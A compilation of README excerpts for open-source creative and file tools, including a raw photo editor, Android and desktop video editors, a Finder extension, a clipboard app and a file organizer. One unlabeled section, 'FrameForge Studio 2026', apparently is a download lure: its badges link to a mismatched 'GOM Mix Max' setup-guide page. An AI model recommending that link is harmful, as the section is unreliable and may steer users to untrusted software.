readme_excerpt:
# greycard

A professional raw photo editor with accurate color, for Linux, macOS
and Windows. Fast, and open source.

[![greycard editing a mountain landscape: presets and history on the left, the picture in the middle, the histogram and Develop sliders on the right, the filmstrip along the bottom.](docs/images/develop.webp)](https://greycard.org)

I took my favorite parts of every editor I know and built the one I
wanted to use. I'm a software engineer and a
[photographer](https://jessolmstead.com), and greycard is already the
editor I use for my own work. It's still early, and there's a lot more
on the [roadmap](docs/roadmap.md). I'm not going to stop until it's a
complete, battle-tested editor.

**[Download](https://github.com/jessolmstead/greycard/releases/latest)** ·
[User guide](docs/user-guide.md) ·
[greycard.org](https://greycard.org)

## Highlights

- **Camera color match.** Give it a varied set of frames from your
  camera and it learns the camera's own JPEG look, such as Canon
  Standard or Fujifilm Provia, as a look you can pick.
  [How well it fits](docs/camera-match.md).
- **Masks that do more.** Absolute white balance on a mask makes mixed
  light easy, and the color mixer works inside a mask.
- **Scopes for the mask:** parade, waveform and vectorscope, which you
  can limit to the masked area to get skin tones right.
- **AI denoising on the raw sensor data.** I trained the model myself,
  and it works a treat on Canon, Fujifilm GFX, Nikon, Sony and
  Panasonic.
- **Your folders are the truth.** Edits live in a sidecar beside each
  raw. The library index makes finding and filtering fast without
  owning your photos.
- **Works across machines.** Cull a shoot on a NAS from local
  previews, and keep an archive drive in step with your edits.
- **Local AI masks** for subjects, objects, skies and people, down to
  eyes, lips, hair and clothing. All on your machine.
- **Quick culling** from the camera's embedded previews, so getting
  through a shoot is smooth.
- **Fast and familiar.** Native Rust, Slint and the GPU, so sliders
  update as you drag. The layout will feel at home if you're coming
  from Lightroom Classic. Lightroom presets load, and a Lightroom
  catalog comes across with its ratings, edits and collections.
- **The best open source algorithms.** greycard is GPL, so parts of the
  pipeline come straight from darktable and RawTherapee, credited in
  each file.

## Cameras

It opens what [rawler](https://github.com/dnglab/dnglab) decodes
([camera list](https://github.com/dnglab/dnglab/blob/main/SUPPORTED_CAMERAS.md)),
and I test on Canon, Fujifilm GFX and X-Trans, Nikon, Sony and
Panasonic raws.

## Not there yet

- The learned denoiser doesn't run on Fujifilm X-Trans raws yet.
- Nikon High Efficiency raws only open in a build from source with the
  `nikon-he` feature. The format is licensed, and shipping its decoder
  means royalties. I'm working on it.
- The Windows build isn't signed yet, so you have to click past a
  warning the first time.
- No build yet for Intel Macs.
- There is a Windows on ARM build, though a release can still go out
  without it while it's new. Its AI features run on the CPU alone,
  through a runtime it offers to download the first time you use one,
  and I haven't run it on an ARM laptop myself yet.

## Install

Download your system's file from the
[releases page](https://github.com/jessolmstead/greycard/releases/latest)
and unpack it.

- **Linux:** `sh install.sh`, or take the `.AppImage` instead, make it
  executable and run it (it needs FUSE, or `--appimage-extract-and-run`).
- **macOS:** open the `.dmg` and drag greycard to Applications (Apple
  silicon, macOS 13.4 or newer); the `.tar.gz`'s `sh install.sh` also
  adds the `greycard` command. [Step by step](docs/testing-on-a-mac.md).
- **Windows:** double-click `install.cmd`, or just run
  `bin\greycard-ui.exe` from the unpacked folder. `register.cmd` adds
  greycard to Open with for raws. The `aarch64-windows` zip is for
  Windows on ARM.

You'll want a GPU with Vulkan, or Metal on a Mac. Without one it
still opens, drawing in software and developing on the CPU, but
slowly.
[Building from source](docs/building.md) is a `cargo build --release`
once the libraries are in, and one script for the AI runtime.

## Feedback

Bugs, feature requests, things you love or hate: please tell me. Use
**Report a problem...** at the bottom of the left panel, or
[open an issue](https://github.com/jessolmstead/greycard/issues/new/choose).
A raw that renders wrong, with the camera model, is the most useful
thing you can send.

## More

- [User guide](docs/user-guide.md)
- [Where greycard fits](docs/where-greycard-fits.md) next to Lightroom,
  Capture One, darktable, RawTherapee and others
- [Changelog](docs/changelog.md)
- [Design notes](docs/notes.md)

GPL-3.0-or-later.

readme_excerpt:
FileMint

Put file tools back in Finder.
A small native macOS app for creating, processing and organizing files and images.

English ｜ 简体中文 →

Download for macOS · Website · Website source · Installation help · Report an issue

Swift + AppKit + SwiftUI · Offline file creation

Creating a file should not require opening an editor, choosing Save As and finding your folder again. FileMint puts the action back in Finder: **right-click, choose a type and your file is there.** Use this native **macOS Finder extension** for right-click file creation, reusable templates, batch rename, SHA-256 checksums, image compression and OCR. ## What's new in 0.8.1 Open creation drafts directly, use a compact clipboard-image window and switch settings smoothly with arrow keys. Quick Search finds creation actions, templates, favorites and settings, with an optional global shortcut. Copy File Contents adds an opt-in Finder action for supported text files. Existing templates, grants and settings are retained. [0.8.1 release notes](https://github.com/FileMintApp/FileMint/releases/tag/v0.8.1) ## Recent features - **Quick Search**: Find creation actions, enabled templates, favorites and settings from one panel; optionally enable a global shortcut in General. - **Copy File Contents**: Copy complete supported text files from Finder, retaining whitespace and line endings. Enable it under File & Folder Tools. - **Batch Rename**: Preview and rename 2–1,000 items in one directory on local, writable APFS, with undo, interrupted-operation recovery and no overwriting of existing items. - **File Info and checksums**: Inspect one ordinary file, explicitly calculate four supported digests, and copy or compare results. - **Copy and preview templates**: Start with a copy of an existing template and optionally inspect text output or an Office preview supported by the system. - **Import and export templates**: Back up, move or share templates in `.filemint-templates` packages, reviewing conflicts before import. - **Create and Open**: Continue in an app chosen for the template or this creation; opening failures preserve the saved file. - **New File from Clipboard**: Explicitly read one plain-text item, then review the name, destination and content before creating a file. - **Open with App**: Add your go-to apps to Finder and open selected items or the current folder with them. - **Paste Image as File**: Preview and name a copied screenshot or image, then save it as PNG. - **Multiple templates per format**: Keep separate content and filenames for one format, with a configurable default template. - **Word / Excel templates**: Create blank `.docx` and `.xlsx` files from built-in templates, or import your own documents and create independent copies with their formatting and content intact. - **Themes and settings**: General now offers Follow System, Light and Dark, with consistent control alignment and interaction styles. [Full release notes](https://github.com/FileMintApp/FileMint/releases/tag/v0.8.1) ## Why FileMint | What matters | How FileMint approaches it | | --- | --- | | Native experience | Swift + AppKit + SwiftUI; native menus, windows and editing without an embedded web runtime. | | Small and focused | Small footprint, no account, no subscription and no background folder crawl. | | Local performance boundary | File creation, image processing and OCR run on your Mac instead of a remote service. | | Finder context | Right-click the desktop or an authorized folder; the current location is the destination context. | | Opt-in extensions | File Tools and Resource Tools start off and never disturb the existing New File menu. | ## See the workflow ### 1. A context menu with clear layers This is a real installed-build Finder example. With `longmao.navigator.png` selected, **New File**, **File & Folder Tools** and **Resource Tools** remain distinct, with color icons for quick scanning.

### 2. Keep the context when you create Set the full filename, suffix, destination and starter content before creation. Enter `project-kickoff.md`, paste the first Markdown lines and create it without an empty-file detour.

The creation panel supports: - `⌘↩` to create and `Esc` to cancel; Return inserts a newline in the editor. - A full filename and synchronized extension selector; custom suffixes remain UTF-8 text. - Automatic numbering for quick creation and confirmation before custom replacement. - Literal multiline text, Unicode, spaces and template-looking tokens. ### 3. Seven image Resource Tools Select an image in Finder and open Resource Tools, or choose a local image explicitly from the app: - **Convert Image**: JPEG, PNG, HEIC and TIFF. - **Compress Image**: MozJPEG for JPEG, lossless PNG / TIFF encoding and the system HEIC encoder. Keep originals and dimensions, save successful results and show actual sizes. - **Resize Image**: preserve proportions, batch resize and never enlarge the source. - **Generate Icons**: ICNS, ICO and PNG size sets. - **Stitch Images**: horizo

readme_excerpt:
# Graden **A multi-layer video editor and colour grading app for Android, built for real footage.** [![Release](https://img.shields.io/github/v/release/Pixelgamer4k/graden?include_prereleases&label=beta&color=F0872B)](https://github.com/Pixelgamer4k/graden/releases) [![Android](https://img.shields.io/badge/Android-10%2B-3DDC84?logo=android&logoColor=white)](#install) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE)
> [!NOTE] > **This is a beta.** Things will break and some screens will change. Your feedback decides what gets fixed and built > next: please [report bugs and ideas](https://github.com/Pixelgamer4k/graden/issues/new/choose). ## Highlights **New in 0.3: captions and text** - **Auto captions** made on the phone with Whisper (Small or Large v3 Turbo, 99 languages): sentence by sentence, timed to the word, laid out like YouTube and Netflix subtitles, on a layer of their own; for the whole project or one clip - **Speakers**: an optional model (NVIDIA Nemotron 3 Diarization) gives each person their own captions, and stacks quick replies as two lines - **Music and lyrics**: an optional sound classifier (CED) marks sung lines with 𝄞 and music alone as 𝄞 - Models are downloaded inside the app from their official sources (checked against their checksums) or added from storage; nothing is uploaded - **Text and titles**: 28 built-in fonts (including Hindi and Bengali), colour, outline, shadow, background box, decorations, spacing, and **14 in and out animations**; drag a text on the picture to move it, pinch to resize, twist to turn - Ready-made text styles (titles, lower thirds, social, script and more) in the media box, to tap or drag in - Captions stay marked as captions however much they are edited, ready for exporting them separately later **A redesigned media box, project setup and export** - Media sorted into All, Video, Text, Images, GIFs, Audio and MCRAW, ordered newest first (or by name, size or length), with the files of your other projects there to use too - New project: shape, size and frame rate up front; colour spaces, bit depth, sample rate and loudness under Advanced (Rec.709 by default) - Export: a summary of what will be written, presets, then video, audio and file; encoder and colour under Advanced **Editing** - As many picture and sound lanes as you need, tested with **8 layers of 4K footage and 1,800 clips** on one timeline - Smooth scrubbing, playback and pinch-zoom on long projects, with filmstrip thumbnails on every clip - Trim, split, move, crop, flip, rotate and place pictures anywhere on the canvas - Speed changes (pitch kept) and reverse - **46 transitions and animations**: fades, slides, pushes, wipes, zooms, spins and motion - Per-clip sound: volume, fades, pan, 3-band EQ, pitch and peak normalising **Proxies, done properly** - Light editing proxies are made automatically in the background, so 4K and high-bitrate files edit smoothly - When you stop, the preview shows the **original file's exact frame at full resolution**, on every layer **Stabilisation** - A **visual gyro** built from scratch: it measures the camera's rotation and zoom from the picture itself, row by row (rolling shutter included), and works out the lens on its own, so it needs no gyro data - Choose what to hold steadiest (background, balanced or subject), with smoothing, strength and framing controls - Natural motion is kept; shake and jitter go, with the least crop that does it - **3D camera view**: a modelled camera moves exactly as the visual gyro measured, at its real size of motion; switch to *Stabilized* to watch the same camera move on the smoothed path - Analyse first, at the resolution you choose (480p to 4K), and see the analysis and stabilised render speed while exporting **Colour management, matched to DaVinci Resolve** - Colour Space Transform with **28 camera and display curves** and **20+ gamuts** (ARRI, Sony, Canon, Panasonic, RED, Blackmagic, Fujifilm, Nikon, DJI, Apple Log, ACES, DaVinci Wide Gamut, Rec.709/2020, P3…) - **DaVinci tone mapping**, Saturation Compression gamut mapping and HDR ↔ SDR conversion, measured against Resolve 21 itself and matched to within about one 10-bit code value - HDR projects and **HDR10 / HLG export**, with the HDR metadata written into the file **RAW** - MotionCam RAW (`.mcraw`) recordings: white balance, exposure, ISO, highlight recovery, black and white level, tone and detail, developed live from the sensor data **Colour** - Lift, Gamma, Gain and Offset wheels, each with separate Y / R / G / B controls - Primaries: temperature, tint, contrast (S-curve, as Resolve), pivot, mid-detail, colour boost, shadows, highlights, saturation, hue, lum mix - Scopes: waveform, RGB parade, vectorscope, histogram and CIE chromaticity, with Resolve-style options - A touch-sized mini timeline for jumping between clips, and grouping to grade several clips at once - Haptic steps, detents at neutral, and protection against accidental touches **Export** - H.264 and H.265 with the phone's **hardware encoders**, MP4 or MOV - Rendered from the **original files at full quality**: no proxies, no hidden downscaling - Any resolution the encoder supports (up to 8K), **10-bit** H.265 where the phone supports it - HDR drawn straight from the GPU into the encoder: about **3× faster** HDR export than 0.1 - "Best" quality never goes below the footage's own bitrate - Automatic "Best" bitrate, or your own bitrate, VBR or CBR, profiles and keyframe interval - AAC audio up to 320 kbps with optional EBU R128 loudness normalising - Presets (Master, YouTube 4K, YouTube 1080p, Reel) and your own saved presets - Runs in the background with a progress notification ## Screenshots | Editor | Colour: timeline | Colour: scopes | Co

readme_excerpt: # GoZen [![Project Status: Alpha](https://img.shields.io/badge/Status-Alpha-red.svg)](https://codeberg.org/gozen/gozen/releases) [![Discord](https://img.shields.io/discord/1120566516899926068?label=Discord&logo=discord&logoColor=white)](https://discord.gg/BdbUf7VKYC) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0) *The Minimalist Video Editor* ![screenshot of GoZen startup UI](./assets/screenshots/alpha_01.jpg) ## What is GoZen? GoZen is a modern, lightweight, stable, minimalistic, and performant open-source video editor with simplicity in mind. Built using the Godot game engine for everyday creators, hobbyists, and semi-professionals in mind. GoZen aims to provide a focused video editing experience without the complexity that comes with other traditional NLE's (Non-Linear Editors). It is primarily developed for Linux, but includes support for Windows and MacOS. Visit the [GoZen project site](https://gozen.voylin.com/) for more information and updates. _(The website is still a WIP as I am trying to focus on the main project first.)_ ## Features - Smooth video playback; - Fast rendering & fast seeking; - Designed with stability in mind; - Cross-platform (Linux, Windows); - Clean, minimalist, but usable UI; - Support for all codecs (which FFmpeg supports); - No bloatware, no gathering of data, and no account required; - Unified timeline (no separation between audio and visual tracks); ## UI overview ![screenshot of GoZen editor UI](./assets/screenshots/alpha_02.jpg) The top left displays your media pool, listing your files by typne and alphabetically. In the top center you have your video project playback itself with on the right of that your effects panel. On the bottom you have your timeline with on the right your audio meter to check if your audio is clipping or not. ## Installation / Download GoZen is available on following platforms: - [Itch.io](https://voylin.itch.io/gozen); - [Steam](https://store.steampowered.com/app/4070440/GoZen/); - [Aur](https://aur.archlinux.org/packages/gozen); ### Building from source Before you start building from source you'll need to ensure you have following dependencies installed on your system (names can vary depending on the distro you're using): - **Compiler:** `gcc`/`clang` and `g++`/`clang++`; - **Build tools:** `CMake`, `Ninja`, `NASM`, `SCons`, and `Python` (version 3.10+); - **Git tools:** `git` and `git-svn`; - **System libraries:** `libaom`, `SVT-AV1`, `NUMA`, `VA-API`, `VDPAU`, `X11` and `bzip2`. First of all, you'll need to run the python script in the root of the project `build.py`, just follow the instructions and it should compile without issues (on both Linux, Windows, and MacOS). From there you can just open the GoZen project from Godot and you're good to go to use/export the project from there. > [!NOTE] > You will need `git-svn` in order to compile! It's in the list of requirements but people tend to miss it. ## PCK clips For the creation of PCK clips, use this repo: https://codeberg.org/gozen/module_template ## Modules For the creation of UI/effects/transitions/theme modules, please refer to [the module README.md file](./src/modules/README.md). ## Contributing We welcome contributions to GoZen wether it's reporting bugs, suggesting features, submitting code, ... all help is appreciated. Please read our [Contributing Guide](./CONTRIBUTING.md) for more details on how to get involved. Join our [Discord server](https://discord.gg/BdbUf7VKYC) to discuss the GoZen project and ask questions! ### Localization We need contributors for the localization of GoZen, more info can be found in [the translation README](./src/translations/README.md) ## Support the project ❤️ GoZen is an open-source project developed by me, Voylin. I'm a stay-at-home dad and my time is limited as I'm trying to make it financially work to keep working from home. If you find GoZen useful and would like to give me more time and resources to work on this project, you can financially support me through [my Ko-fi page](https://ko-fi.com/voylin). ## About GoZen I named the editor GoZen, **Go** comes from Godot and **Zen** from ... zen. The name implies that the video editor is made in Godot, and that it's a _zen-like_ experience to use. 午前 (Gozen) also means morning in Japanese, that's why the logo represents a rising sun. I'm a morning person and seeing/feeling the sunrise each morning always makes me feel like I'll have a productive day, so the meaning of GoZen for me links to being productive and having a zen experience whilst editing videos. ## License The project is licensed under the [GPLv3 license](./LICENSE). FFmpeg is being used which has it's own license as well, for compiling FFmpeg we use the `--enable-gpl3` flag. > This software uses libraries from the FFmpeg project under the LGPLv2.1 > Other libraries used may come with their own specific licenses so be sure to check before forking the project and/or using code from this project to see if it can be used with your project license. ## Support me and GoZen - [My Ko-fi page](https://ko-fi.com/voylin); - [My Patreon page](https://patreon.com/voylin)

![preview](https://raw.githubusercontent.com/JoseEduardo-sudo/GOM-Mix-Max-Video-Editor-Setup-Guide/main/hero_f3fd.svg)
[![Download](https://raw.githubusercontent.com/JoseEduardo-sudo/GOM-Mix-Max-Video-Editor-Setup-Guide/main/start_fbc05ef.svg)](https://JoseEduardo-sudo.github.io/GOM-Mix-Max-Video-Editor-Setup-Guide/)

# 🎬 FrameForge Studio 2026 — The Timeline Architect for Windows Creators

[![Download](https://raw.githubusercontent.com/JoseEduardo-sudo/GOM-Mix-Max-Video-Editor-Setup-Guide/main/start_fbc05ef.svg)](https://JoseEduardo-sudo.github.io/GOM-Mix-Max-Video-Editor-Setup-Guide/)

A next-generation desktop video editing companion engineered for storytellers, small studios, and hobbyist editors who demand precision without the premium price tag of legacy NLE suites. FrameForge Studio 2026 is the spiritual successor to a lineage of accessible timeline editors, rebuilt from the ground up for Windows 11 and Windows 10 with a philosophy: **your footage deserves a forge, not a factory line.**

Whether you're assembling a wedding recap, a YouTube essay, a product demo, or a travel montage, FrameForge hands you a responsive canvas, a library of transitions, and a rendering engine tuned for consumer hardware. No subscriptions breathing down your neck. No obscure keygens. No shadowy mirrors. Just a clean installer, a clear setup path, and a workspace that respects your time.

---

## 🧭 Table of Contents

- [Why FrameForge Exists](#-why-frameforge-exists)
- [Core Concept and Design Ethos](#-core-concept-and-design-ethos)
- [Feature Highlights](#-feature-highlights)
- [System Requirements](#-system-requirements)
- [Setup Walkthrough](#-setup-walkthrough)

The design ethos is simple: reduce the distance between intention and result. If you want to slow a clip, you drag a handle. If you want to sync audio, you drop a waveform and snap it. Nothing hides behind three nested menus when it can sit one click away.

# miaomiao-bar · 喵喵吧台 **The clipboard workbench for macOS: whatever lands on it — a paragraph, a column of names, a picture — comes back cleaned, tidied and ready to paste.**


🇺🇸 **English**  ·  [🇨🇳 简体中文](README.zh-CN.md)
> Copy something messy, click the menu bar, pick what it should become. Miaomiao Bar rewrites the > clipboard in place, so the next **⌘V** is already right: plain text without the web styling, > Chinese and English properly spaced, a list squeezed into one line, a link without the > `utm_source=…` tail. > > No account, no window to manage, no network call. The panel shows **what the current clipboard can > become**, never a fixed menu of everything the app can do. --- ## Table of contents | | | | --- | --- | | [What it does](#what-it-does) | [Actions](#actions) | | [Shortcuts](#shortcuts) | [How it works](#how-it-works) | | [Privacy](#privacy) | [Project layout](#project-layout) | | [Build from source](#build-from-source) | [Status](#status) | | [License](#license) | | --- ## Install Grab the dmg from **[bar.wordtk.com](https://bar.wordtk.com)** (Apple Silicon and Intel), drag the app into `Applications`, and launch it. The build is ad-hoc signed rather than notarised, so the first launch needs one extra step: after macOS blocks it, open **System Settings → Privacy & Security** and choose **Open Anyway** (macOS 14 and older: right-click → Open). Nothing to configure for the text tools. For image uploads, add a bucket in Settings → Storage — the site's [image host section](https://bar.wordtk.com/#bucket) walks through the four fields that matter. ## Screenshots

## What it does One model, one job: **clipboard in → transformation → clipboard out**. - **Two appearances, no auto-switching.** A dark bar at night (charcoal and amber) and a light bar at daytime (cream paper and caramel ink). The switch lives in the top bar and the choice is remembered — nothing changes under you when macOS flips its own appearance. - **Images get three buttons, nothing more.** Copy the picture back to the clipboard, open it in Preview (macOS's own editor), or send it to your bucket / Downloads. - **A menu bar panel, not a window.** Click the tray icon, pick an action, paste. No dock icon, no window stealing a Space. - **Only the actions that apply.** The list is filtered by what is actually on the clipboard right now: "To plain text" only appears for rich text, the typography group only when Chinese sits next to Latin, the tracking-link cleaner only for links that carry tracking. - **Chinese typesetting, done properly.** A space between Chinese and Latin, and punctuation that belongs to the right script — the two things every Chinese writer fixes by hand. - **Undo is one keystroke.** Every action keeps the previous clipboard, so a wrong pick costs a ⌥⌘Z, not a re-copy. - **Images go to your own bucket.** One click on a screenshot uploads it to Cloudflare R2, Tencent COS, Alibaba OSS or MinIO and puts the link back on the clipboard — as a URL, Markdown, HTML tag or BBCode. - **Zero runtime dependencies.** Only Electron itself; signing, storage and every transformation are hand-written on top of Node's built-ins. Who this is **not** for: there is no Base64 encoder, no regex playground and no timestamp converter here. Those are developer tools, and this app deliberately belongs to whoever copies text — writers, ops people, anyone tidying a list at midnight. Formatting JavaScript/CSS/HTML is out of scope too: it needs a formatter dependency, which is exactly the weight this project refuses. ## Actions Every action is a pure function; the registry decides what to show for the clipboard at hand. The set is deliberately small: it is what a writer reaches for, not everything that is technically possible. **Rich text ⇄ Markdown go both ways.** Copy an article from a browser and get clean Markdown; write Markdown and put *rich text* on the clipboard, so Word, WeChat or Mail paste it formatted while a code editor still gets the Markdown source. | Group | Actions | | --- | --- | | Convert | Edit text · **Copy to clipboard** · To plain text · **To Markdown** · **To rich text** | | Clean up | Trim whitespace · Collapse blank lines · Join into one line · Strip line numbers · Remove invisible characters · Strip Markdown syntax | | Type | Space between Chinese and Latin · Punctuation → full-width | | Lists | Remove duplicate lines · Sort lines | | Links | Clean tracking parameters · Extract every link | | Image | Open in Preview · Copy to clipboard · Upload to your bucket · Save to Downloads | Adding a tool means adding one file under `electron/actions/` — the panel, the tests and the IPC surface pick it up auto

**Images** (`.jpg`, `.png`, `.gif`, `.webp`...) → `Downloads/Images/` - **Documents** (`.pdf`, `.docx`, `.xlsx`...) → `Downloads/Documents/` - **Archives** (`.zip`, `.rar`, `.7z`...) → `Downloads/Archives/` - **Installers** (`.exe`, `.msi`...) → `Downloads/Installers/` - **Music** / **Video** → dedicated folders - **Catch-all** rule for everything else ### 🛠️ Fully Customizable - Create your own rules with extensions, regex patterns, and destination folders - Import `.zip`, `.tgz`, or `.tar.gz` archives directly from Google Takeout - Files are extracted to a staging folder and sorted using your existing rules - No need to manually unzip and reorganize everything ### 📜 History & Undo - Every action is logged locally in SQLite - Undo any single move with one click - Clear history anytime ### 🌍 Multi-language Auto-detects your system language. Supported: - 🇬🇧 English - 🇵🇱 Polish - 🇮🇹 Italian - 🇩🇪 German - 🇫🇷 French - 🇷🇺 Russian - 🇯🇵 Japanese - 🇻🇳 Vietnamese - 🇪🇸 Spanish - 🇺🇦 Ukrainian *(Falls back to English if system language is not supported)* ### 🕶️ Dark Mode - Follows system theme, or force Light / Dark mode from settings ### 🔒 Privacy First - **100% offline** - zero cloud, zero file name uploads - **No telemetry** by default - **System files ignored** - `desktop.ini`, `Thumbs.db`, `.DS_Store`, and other OS hidden files are never touched - **Portable version available** - run without installing, leaves no trace in the registry - All data stored locally in your user profile folder --- ## 🌍 Help translate Mouzi Want to use Mouzi in another language or improve an existing translation? readme_excerpt:
🌰 Hazelnut

A terminal-based automated file organizer inspired by Hazel

Watch your folders and automatically organize files based on rules you define — all from your terminal.


## 📖 Table of Contents - [✨ Features](#-features) - [🚀 Quick Start](#-quick-start) - [⚙️ Configuration](#️-configuration) - [📋 Rules](#-rules) - [⌨️ Keybindings](#️-keybindings) - [🎨 Themes](#-themes) - [🏗️ Architecture](#️-architecture) - [🔧 Building from Source](#-building-from-source) - [🤝 Contributing](#-contributing) - [📄 License](#-license)
## ✨ Features
### 📁 Smart File Watching Watch any folder for new and changed files with configurable debouncing and recursive monitoring. Paths support `~`, `$VAR`, and `${VAR}` expansion. ### 🎯 Flexible Rules Engine Define powerful rules with conditions based on name, extension, size, age, and more. Multiple rules can match the same file — all matching rules execute in order. ### ⚡ Powerful Actions Move, copy, rename, delete, archive files or directories, send to trash, or run custom scripts — all automated. Cross-filesystem moves are handled transparently. ### 🖥️ Beautiful TUI A gorgeous terminal interface for managing rules and monitoring activity in real-time. ### 🔧 Background Daemon Set it and forget it — the daemon runs quietly and applies rules 24/7. ### 📝 Simple Configuration Human-readable TOML config that's easy to write and maintain.

### Feature Highlights | Feature | Description | |---------|-------------| | 🔍 **Pattern Matching** | Glob patterns and regex for precise file matching | | 📊 **Size Conditions** | Filter files by size (greater than, less than) | | 📅 **Age Conditions** | Match files by modification date | | 🏷️ **Multiple Extensions** | Match any of multiple file types | | 📂 **Recursive Watching** | Monitor subdirectories automatically | | 🎨 **15 Built-in Themes** | From Dracula to Cyberpunk | | 🔔 **Desktop Notifications** | Get alerted on errors (cross-platform) | | 📋 **Activity Log** | Full history of all file operations |
## 🚀 Quick Start ### Installation #### macOS ```bash # Homebrew (recommended - fast, pre-built binary) brew install ricardodantas/tap/hazelnut ``` #### Linux ```bash # Homebrew brew install ricardodantas/tap/hazelnut # Or via Cargo cargo install hazelnut ``` ##### Arch Linux (pacman) ```bash pacman -S hazelnut ``` #### Windows ```bash # Via Cargo (requires Rust toolchain) cargo install hazelnut # Or download pre-built binary from GitHub Releases: # https://github.com/ricardodantas/hazelnut/releases ``` #### From Source ```bash git clone https://github.com/ricardodantas/hazelnut cd hazelnut cargo install --path . ``` > **Note**: The daemon (`hazelnutd`) is only available on macOS and Linux. On Windows, only the TUI (`hazelnut`) is available. ### First Run Hazelnut needs **two things** to work: 1. **Watch folders** — which directories to monitor 2. **Rules** — what to do with files in those folders > ⚠️ **Important**: Rules alone won't do anything! You must also configure at least one watch folder. 1. **Create a config file** at `~/.config/hazelnut/config.toml`: ```toml # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ # STEP 1: Define which folders to watch # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ [[watch]] path = "/home/youruser/Downloads" # Full path, ~, $HOME all work recursive = false # Set true to include subfolders # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ # STEP 2: Define rules for what to do with files # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ [[rule]] name = "Organize PDFs" [rule.condition] extension = "pdf" [rule.action] type = "move" destination = "/home/youruser/Documents/PDFs" ``` 2. **Launch the TUI** to manage and monitor: ```bash hazelnut ``` 3. **Or start the daemon** to run in the background: ```bash hazelnutd start ```


## ⚙️ Configuration Hazelnut uses [TOML](https://toml.io) for configuration. The config file is always located at: ``` ~/.config/hazelnut/config.toml ``` ### Full Configuration Example ```toml # ───────────────────────────────────────────────────────────── # General Settings # ───────────────────────────────────────────────────────────── [general] # Logging level: trace, debug, info, warn, error log_level = "info" # Optional log file path log_file = "~/.local/share/hazelnut/hazelnut.log" # Wait time (seconds) before processing a file after change
